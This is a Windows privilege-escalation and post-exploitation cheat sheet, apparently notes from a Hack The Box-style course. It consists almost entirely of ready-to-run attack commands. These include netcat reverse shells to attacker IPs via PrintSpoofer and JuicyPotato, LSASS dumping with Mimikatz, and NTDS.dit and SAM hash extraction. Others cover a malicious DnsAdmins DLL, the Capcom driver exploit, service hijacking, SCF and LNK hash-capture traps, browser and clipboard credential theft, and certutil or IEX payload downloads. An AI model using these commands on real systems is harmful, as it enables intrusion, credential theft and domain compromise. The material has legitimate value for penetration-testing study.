### Information Gathering:
#Windows_Enumeration

**Network Information:****

```python
arp -a
route print
```

**Enumerating Protections:**

```python
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**Testing App-Locker Security:**

```python
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

**Useful Information:**
```python
tasklist /svc
set
systeminfo
wmic qfe
#or 
Get-HotFix | ft -AutoSize
```

**Installed Programs:**

```python
wmic product get name
#or 
Get-WmiObject -Class Win32_Product |  select Name, Version
```

**Display Running Processes:**

```python
netstat -ano
```

**Logged-In Users:**
```python
query user
query session
```

**Current User and Privileges:**
```python
echo %USERNAME%
whoami /priv
```

**Get All Groups:**
```python
net localgroup
```

**Password Policy & Other Account Information:**
```python
net accounts
net user
```

**Listing Named Pipes:**

- Download pipelist.exe from [https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist)
```python
pipelist.exe /accepteula
#or 
gci \\.\pipe\
#or
Get-ChildItem "\\.\pipe\" | Where-Object { -not $_.PsIsContainer } | ForEach-Object { Write-Output "Named Pipe: $($_.FullName)" }
```

**Enumerating Permissions:**

- Download accesschk from [https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- Download accesschk:
```python
Invoke-WebRequest -Uri "http://10.10.16.100:8080/accesschk64.exe" -OutFile "C:\Users\htb-student\Desktop\accesschk64.exe"
```

- Execute accesschk:
```python 
accesschk /accepteula \\.\Pipe\lsass -v #for lsass
#with powershell 
.\accesschk64.exe \pipe\SQLLocal\SQLEXPRESS01 -v 
```

- Get Installed Programs via PowerShell & Registry Keys

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation

PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

###  Windows User Privileges:

#### SeImpersonate and SeAssignPrimaryToken:
#SeImpersonate  #SeAssignPrimaryToken

**NetCat:**

- Download Netcat:
```python
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe

```

**PrintSpoofer:**

- Download PrintSpoofer:
```sh
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe`
```
- Run command:
```cmd
C:\Tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.16.100 8443 -e cmd"
```

**Juicy Potatoes:**

- Download JuicyPotato:
```python
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

- Run command:
```sh
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

#### SeDebugPrivilege
#SeDebugPrivilege

**Dump LSASS:**

- Download procdump.exe:
```sh
wget https://download.sysinternals.com/files/Procdump.zip
```

- Run procdump:
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```


- Download Mimikatz:
```sh
wget https://github.com/ParrotSec/mimikatz/tree/master/x64
```

- Use Mimikatz:
```cmd
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**Tools:**

- Download psgetsystem from:
```sh
wget https://github.com/decoder-it/psgetsystem
```

- Run command:
```powershell
import-module .\psgetsys.ps1

Get-Process winlogon

[MyProcess]::CreateProcessFromParent("552","c:\windows\system32\cmd.exe", "/c c:\windows\temp\nc.exe 127.0.0.1 4444 -e cmd.exe")
```

- Download SeDebugPrivilegePoC from:
```sh
wget https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
```

#### SeTakeOwnershipPrivilege:
#SeTakeOwnershipPrivilege

**View File Ownership:**
```python
 Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

cmd /c dir /q 'C:\Department Shares\Private\IT'
```

**Change File Ownership:**
```python
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

###  Windows Group Privileges :

#### Backup Operators
#Backup_Operators

 **Copying a Protected File:**
 
- Download modules:
```sh
wget https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
```

- Import modules:
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

- Enable SeBackupPrivilege:
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

- Copy Protected file:
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

**Copying NTDS.dit:**

- Download Robocopy :
```sh
wget https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
```

- Run Robocopy:
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

- Use Diskshadow :
```powershell
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

- Copying NTDS.dit Locally :
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

**Extract local account credentials :** 

- Extracting Sytem and Sam : 
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

- Use Impacket : 
```sh
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

**Extracting Credentials from NTDS.dit : **

- Download DSInternals :
```sh
wget https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1
```

- Use DSInternals:
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

- Use Impacket  :
```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

#### Event Log Readers
#Event_Log_Readers


 - Confirming Group Membership :
```cmd
net localgroup "Event Log Readers"
```

 - Searching Security Logs :
```shell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

 - Searching Security Logs with Credential :
```sh
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

 - Searching Security Logs Using Get-WinEvent :
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

#### DnsAdmins
#DnsAdmins

**Leveraging DnsAdmins Access**

 - Generating Malicious DLL :
```sh
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

 - Confirming Group Membership :
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

 - Loading Custom DLL :
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

**Check restart DNS Privilege :**

 -  Finding User's SID :
```powershell
wmic useraccount where name="netadm" get sid
```

-  Checking Permissions on DNS Service :
```powershell
sc.exe sdshow DNS
```

- Restart Dns service : 
```sh
sc stop dns
sc start dns
```

- Confirming Group Membership : 
```powershell 
net group "Domain Admins" /dom
```

`Don't forget to logout or restart your sessions to apply the change !!`

**Using Mimilib.dll**

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

**Creating a WPAD Record**

- Disabling the Global Query Block List

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

- Adding a WPAD Record
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.16.100
```

`Use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes '
#### Print Operators
#Print_Operators

**Enable EnableSeLoadDriverPrivilege**

`if no there is no SeLoadDriverPrivileg we need to bypass UAC  `
 - Bypass UAC :
 ```ruby
https://github.com/hfiref0x/UACME
```

 - Download  EnableSeLoadDriverPrivilege :
```cmd
curl -o https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp EnableSeLoadDriverPrivilege.cpp
```

 - Compile with cl.exe :
 ```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

 - Enable EnableSeLoadDriverPrivilege :
```cmd
EnableSeLoadDriverPrivilege.exe
```

 **Load Capcom.sys**
 
 - Download  Capcom.sys:
```powershell
curl Capcom.sys -o https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
```

  - Add Reference to Driver:
```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

  - Download DriverView:
```cmd
http://www.nirsoft.net/utils/driverview.html
```

  - Verify Capcom Driver is Listed:
```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

 **Exploit**
 
  - Download Exploit:
```sh
https://github.com/musheebat/Compiled-capcom-exploit/blob/main/ExploitCapcom.exe
https://github.com/tandasat/ExploitCapcom
```

   - Use ExploitCapcom : 
```powershell
PS C:\htb> .\ExploitCapcom.exe
```

**Alternate Exploitation - No GUI **

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

**Automating the Steps**

We can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following

   - Download EoPLoadDriver : 
```cmd
wget https://github.com/TarlogicSecurity/EoPLoadDriver/
```

   - Use EoPLoadDriver : 
```powershell
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

#### Server Operators
#Print_Operators

   - Confirming service starts : 
```cmd
 sc qc AppReadiness
```

   - Download Psservice :
```sh
wget https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
```

   - Checking Service Permissions :
```cmd
c:\Tools\PsService.exe security AppReadiness
```

- Modifying the Service Binary Path

```sh
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

- Retrieve Credential :

```sh
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```


### OS Exploitation
#### User Account Control
#UAC

- Confirming UAC is Enabled :
```shell
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

- Checking UAC Level :
```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

- Checking Windows Version
```powershell
[environment]::OSVersion.Version
```

- Ressources : 
https://en.wikipedia.org/wiki/Windows_10_version_history
https://egre55.github.io/system-properties-uac-bypass/

#### Weak Permissions
#Weak_Permissions

**Weak Binary Permissions**

- Download SharpUp :
```sh
wget https://github.com/GhostPack/SharpUp/
```

- Run SharpUp :
```powershell
 .\SharpUp.exe audit
```

 - Checking BInary Permissions : 
 ```sh
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

 - Replacing Service Binary
```sh
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
#then start the service
sc start SecurityService
```

 **Weak Service Permissions**

- Download Accesschk : 
```sh
wget https://download.sysinternals.com/files/AccessChk.zip
```

- Checking Permissions : 
```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```
 
- Changing the Service Binary Path :
```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

 **Searching for Unquoted Service Paths**

- Querying Service : 
```sh
sc qc SystemExplorerHelpService
```

- Searching for Unquoted Service Paths :
```sh
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Permissive Registry ACLs**
 
- Checking for Weak Service ACLs in Registry :
```cmd-session
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

- Changing ImagePath with PowerShell :

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

**Modifiable Registry Autorun Binary**

 - Check Startup Programs : 

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

- Ressources : 
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

#### Kernel Exploits
#Kernel_Exploits

**Escalation with Metasploit**

- After Metrepreter
    - `run post/multi/recon/local_exploit_suggester`

**Manual Kernel Exploitation**

- In windows PS
    - `systeminfo`
    - Copy the data from above commands.
- In attacker machine
    - Save the data in a text file
    - `windows-exploit-suggester.py --database <db-date>.xlsx --systeminfo systeminfo.txt`

**Checking Permissions on the SAM File**
```sh
icacls c:\Windows\System32\config\SAM
```

**Enumerating Missing Patches**

- Examining Installed Updates:
```powershell-session
systeminfo
wmic qfe list brief
Get-Hotfix
```

- Ressources :
https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808

#### Vulnerable Services
#Vulnerable_Services
- Enumerating Installed Programs : 

```cmd
wmic product get name
```

- Enumerating Local Ports : 

```cmd
netstat -ano | findstr 6064
```

- Enumerating Process ID

```powershell
get-process -Id 3324
```

- Enumerating Running Service

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

#### DLL Injection 
#dll
 - LoadLibrary:
 - Manual Mapping:
 - Reflective DLL Injection : https://github.com/stephenfewer/ReflectiveDLLInjection
 - DLL Hijacking:


### Credential Theft
#Credential
#### Credential Hunting

**Application Configuration Files**

- Searching for Files
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

 - Dictionary Files
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

**PowerShell History File**

- Confirming PowerShell History Save Path :
```powershell-session
(Get-PSReadLineOption).HistorySavePath
```

- Reading PowerShell History File
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

- One-liner command : 
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

**PowerShell Credentials**

- Decrypting PowerShell Credentials:

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

#### Other Files

- Tools :  https://github.com/SnaffCon/Snaffler

-  Search File Contents for String - Example 1:
```cmd
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

-  Search File Contents for String - Example 2:
```cmd
findstr /si password *.xml *.ini *.txt *.config
```

-  Search File Contents for String - Example 3:
```cmd
findstr /spin "password" *.*
```

- Search File Contents with PowerShell:
```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

- Search for File Extensions - Example 1
```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

- Search for File Extensions - Example 2
```cmd
 where /R C:\ *.config
```

- Search for File Extensions Using PowerShell
```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

- Download PSSqlite:
```sh
wget https://github.com/RamblingCookieMonster/PSSQLite
```

- Viewing Sticky Notes Data :
```powershell
Set-ExecutionPolicy Bypass -Scope Process

cd .\PSSQLite\
Import-Module .\PSSQLite.psd1

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

- Other Interesting Files :
```sh
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

#### More Credential Theft

**Cmdkey Saved Credentials**

- Listing Saved Credentials
```cmd
cmdkey /list
```

- Run Commands as Another User
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

**Browser Credentials**

- Download SharpChrome : 
```sh
wget https://github.com/GhostPack/SharpDPAPI
```

- Retrieving Saved Credentials from Chrome :
```powershell
.\SharpChrome.exe logins /unprotect
```

**Password Managers**

If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as keepass2john to extract the password hash

- Extracting KeePass Hash
```sh
python keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

**Email**

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool MailSniper .
- Tool : 
https://github.com/dafthack/MailSniper

 **Tools**

- Download LaZagne:
 ```sh
wget  https://github.com/AlessandroZ/LaZagne
 ```
 
- Run LaZagne : 

```powershell
.\lazagne.exe all
```

**OR**

- Download SessionGopher :
```sh 
wget https://github.com/Arvanaghi/SessionGopher
 ```

- Use SessionGopher :
```powershell-session
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

**Windows AutoLogon**

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Enumerating Sessions **

```powershell-session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

**Wifi Passwords**

- Viewing Saved Wireless Networks
```cmd
netsh wlan show profile
```

- Retrieving Saved Wireless Passwords
```cmd
netsh wlan show profile ilfreight_corp key=clear
```


### Additional Techniques
#Additional_Technique
#### Interacting with Users

**Monitoring for Process Command Lines**

- Creating procmon.ps1 : 

```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}

```

- Running Monitor Script :

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

- Tools to analyse Traffic :
https://github.com/DanMcInerney/net-creds

 **SCF on a File Share**

A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

**Malicious SCF File**

In this example, let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.


- Malicious file :
```shell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

**Starting Responder**

Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.

- Listening :
```shell
p4v1c@htb[/htb]$ sudo responder -wrf -v -I tun0

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```

- Tools to listen : 
https://github.com/lgandx/Responder
https://github.com/Kevin-Robertson/Inveigh
https://github.com/Kevin-Robertson/InveighZero


**Capturing Hashes with a Malicious .lnk File**

This attack no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:

- Generating a Malicious .lnk File

```powershell

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

#### Pillaging

**Data Sources**

Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

**Copy Firefox Cookies Database**

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

- Download CookieExtractor :
```sh
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
```

- Extract website Cookie  from Database : 
```shell
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

**Clipboard** 
- Download ClipboardLogger : 
```sh
wget https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1
 ```
 
 - Monitor the Clipboard:
```powershell
Invoke-ClipboardLogger
```


#### Miscellaneous Techniques

**Always Install Elevated**

- Enumerating Always Install Elevated Settings :
```powershell
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

- Generating MSI Package

```shell
 msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

- Executing MSI Package:
```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

**Scheduled Tasks**

- Enumerating Scheduled Tasks :
```cmd
 schtasks /query /fo LIST /v
```

- Enumerating Scheduled Tasks with powershell :
```powershell
Get-ScheduledTask | select TaskName,State
```

**User/Computer Description Field**

- Checking Local User Description Field:
```powershell
Get-LocalUser
```

- Enumerating Computer Description Field 
```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

**Mount VHDX/VMDK**

- Mount VMDK on Linux
```shell
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

- Mount VHD/VHDX on Linux

```shell
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

- Retrieving Hashes using Secretsdump.py

```shell
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### Ressources

- Download Runas
```sh
wget https://github.com/antonioCoco/RunasCs
```

- Switch user cmd
```sh
Runas.exe Administrator password "cmd /c whoami "
```

- Bypass Powershell Policy 
```powershell-session
Set-ExecutionPolicy Bypass -Scope Process
```
- Compiled Tools : 
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

- Grep on Windows : 
```sh
cat file.txt | Select-String password
```

- Living Off The Land Binaries and Scripts (LOLBAS):
https://lolbas-project.github.io/#

- Transferring File with Certutil :
```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

- Encoding File with Certutil : 
```cmd-session
certutil -encode file1 encodedfile
```

- Decoding File with Certutil
```cmd-session
 certutil -decode encodedfile file2
```

- Run DLL : 
```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

#Windows_Tools
**Some Automated Tools**

- WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
- Sherlock - https://github.com/rasta-mouse/Sherlock
- Watson - https://github.com/rasta-mouse/Watson
- PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- JAWS - https://github.com/411Hall/JAWS
- Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
- Seatbelt - https://github.com/GhostPack/Seatbelt
- SharpUp - https://github.com/GhostPack/

**Tools Delivery**

- Create a SMB Server in you machine.
- `impacket-smbserver.py <shareName> <sharePath> -smb2support`
    - where, shareName is the name to which SMB will be connected and sharePath is the directory to which attacker is hosting, ‘.’ to host current directory.
- In victim machine,
- Connect
    - `net use \\[host]\[shareName]`
- Copy the file to victim
    - `copy \\[host]\[shareName]\tools.exe \windows\temp\a.exe`
- Close the connection
    - `net use /d \\[host]\[shareName]`
- For more ways to transfer the files: https://medium.com/@dr.spitfire/ocsp-file-transfer-recipe-for-delicious-post-exploitation-a407e00f7346
- We can also use certutil to download the file from windows cmd.
- In attacker machine
    - `python3 -m http.server 1337`
- In victim’s machine
    - `certutil -urlcache -f http://<attacker-ip>:1337/test.exe test.exe`